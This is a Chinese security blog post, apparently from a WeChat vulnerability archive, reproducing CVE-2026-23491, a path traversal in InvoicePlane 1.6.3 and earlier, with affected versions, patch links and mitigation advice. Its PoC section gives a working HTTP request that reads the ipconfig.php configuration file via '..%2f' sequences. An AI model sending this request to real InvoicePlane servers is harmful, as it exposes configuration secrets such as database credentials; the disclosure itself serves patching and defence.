@@ -1,0 +1,149 @@
+---
+cve: "CVE-2026-23491"
+source: "gelusus/wxvl 公众号漏洞文库"
+---
+
+#  【成功复现】InvoicePlane路径遍历漏洞(CVE-2026-23491)  
+原创 弥天安全实验室
+                    弥天安全实验室  弥天安全实验室   2026-09-16 04:26  
+  
+#   
+  
+网安引领时代，弥天点亮未来    
+   
+  
+  
+  
+  
+  
+   
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=2jntd263&tp=webp#imgIndex=0 "")  
+  
+  
+**0x00写在前面**  
+  
+**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=7c3v7kvq&tp=webp#imgIndex=1 "")  
+  
+  
+**0x01漏洞介绍**  
+  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/YfTkN0R6oGjRSUcAbSRb8S40libUpS1Xe6icvUibtcjHP6ZDKJUCuGSUhLLUXLcLPNYiaDvrnTRaqNEDVDUfRDzvn6xRVO0kWxtjBf5F6qQ7nOY/640?wx_fmt=png&from=appmsg "")  
+  
+  
+InvoicePlane是InvoicePlane团队开源的一个应用软件。提供一个自托管的开源应用程序,用于管理您的报价,发票,客户和付款。  
+  
+InvoicePlane 1.6.3及之前版本存在路径遍历漏洞，该漏洞源于Guest模块Get控制器中的get_file方法存在路径遍历，可能导致读取任意文件。  
+  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=7c3v7kvq&tp=webp#imgIndex=1 "")  
+  
+  
+**0x02影响版本**  
+  
+  
+InvoicePlane 1.6.3及之前版本【漏洞成因接口未授权，传参未过滤】  
+  
+  
+**利用条件：**  
+  
+网络可达  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/YfTkN0R6oGhqexl7ic3HAEtvTVicfic4ibrnkR3USYaVGianBbWgfgQGyW3bk0FwVVsbLPpSNlvKaljrpIjAkdghPJqCTT6Qa9wiclLXZSrP7ovJg/640?wx_fmt=png&from=appmsg "")  
+  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=7c3v7kvq&tp=webp#imgIndex=1 "")  
+  
+  
+**0x03漏洞复现**  
+  
+  
+1.访问环境  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/YfTkN0R6oGiaJpicOt6TULibeyWqrkYOleCLSvM1RQrIlXRSibrey7ichSTxghfXRib8FC1wk4BoloZkkbD91giaZ1DGfj4e52Emc2y5qRPBNGkwoA/640?wx_fmt=png&from=appmsg "")  
+  
+  
+2.漏洞利用  
+  
+poc  
+```
+GET /index.php/guest/get/get_file/..%2f..%2fipconfig.php HTTP/1.1
+Host: 127.0.01
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+```  
+  
+漏洞测试，成功读取 ipconfig.php文件内容  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/YfTkN0R6oGgKSHnbmhgI5k3OqYS67mDrVdxW0gzbMuvPMH9msgbTw41mIiaeW6shDUGQz1ynloCppebMI9iawrQeXKVQYyhl4vCpQm8PNVdpQ/640?wx_fmt=png&from=appmsg "")  
+  
+  
+3.弥天安全实验室漏洞库【已验证】  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/YfTkN0R6oGialyEf6PznFDIOxJYoMJVKRXUlXhnmlZQMmDTPwTNXe3icsleEXWicfLCbc48CpATFWl3vCyk4qtiak77vOE22NUMGuuJcMTR0apY/640?wx_fmt=png&from=appmsg "")  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=bzequ3sx&tp=webp#imgIndex=3 "")  
+  
+  
+**0x04修复建议**  
+  
+  
+目前厂商已发布升级补丁以修复漏洞，补丁获取链接：  
+  
+临时缓解措施：  
+  
+安全防御设备WAF、IPS、防火墙等阻断攻击行为。  
+  
+  
+建议尽快升级修复漏洞，再次声明本文仅供学习使用，非法他用责任自负！     
+```
+https://github.com/InvoicePlane/InvoicePlane/commit/add8bb798dde621f886823065ef1841986543c69
+https://github.com/InvoicePlane/InvoicePlane/security/advisories/GHSA-88gq-mv54-v3fc
+https://github.com/InvoicePlane/InvoicePlane/releases
+```  
+  
+  
+技术交流群  
+ ➕VX：xyzy0720  
+  
+  
+弥天简介  
+  
+学海浩茫，予以风动，必降弥天之润！弥天安全实验室成立于2019年2月19日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。  
+  
+口号 网安引领时代，弥天点亮未来  
+  
+  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&randomid=h6lqq1ue&tp=webp#imgIndex=8 "")  
+  
+   
+  
+  
+知识分享完了  
+  
+喜欢别忘了关注我们哦~  
+  
+学海浩茫，  
+  
+予以风动，  
+  
+必降弥天之润！  
+  
+  
+   弥  天  
+  
+安全实验室  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=u34b870m&tp=webp#imgIndex=9 "")  
+  
+  
+  
+
+
+---
+
+> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
